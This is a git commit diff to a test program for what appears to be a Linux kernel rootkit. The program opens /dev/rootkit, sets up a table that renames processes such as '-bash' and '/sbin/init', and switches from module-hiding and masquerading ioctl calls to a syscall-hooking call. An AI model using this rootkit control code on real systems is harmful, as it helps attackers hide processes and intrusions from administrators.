d4a1d44b1a0cebd24fcdede25f2ececb00387d4a
xuan <s986309@gmail.com>
2022-03-11 01:40:17 +0800

    Add test of hook/unhook syscall execve.

--- test.c
+++ test.c
@@ -3,21 +3,22 @@
 #include <sys/ioctl.h>
 #include "rootkit.h"
 
+struct masq_proc masq[2] = {
+    {.orig_name = "-bash",
+        .new_name  = "-fish"},
+    {.orig_name = "/sbin/init",
+        .new_name  = "QQAAQQQ"},
+};
+
+struct masq_proc_req masq_req = {
+    .len = 2,
+    .list = masq,
+};
+
 int main (void) {
     int fd = open("/dev/rootkit", O_RDWR);
+
     // ioctl(fd, IOCTL_MOD_HIDE);
-
-    struct masq_proc masq[2] = {
-        {.orig_name = "-bash",
-         .new_name  = "-fish"},
-        {.orig_name = "/sbin/init",
-         .new_name  = "QQAAQQQ"},
-    };
-
-    struct masq_proc_req masq_req = {
-        .len = 2,
-        .list = masq,
-    };
-
-    ioctl(fd, IOCTL_MOD_MASQ, &masq_req);
+    // ioctl(fd, IOCTL_MOD_MASQ, &masq_req);
+    ioctl(fd, IOCTL_MOD_HOOK);
 }
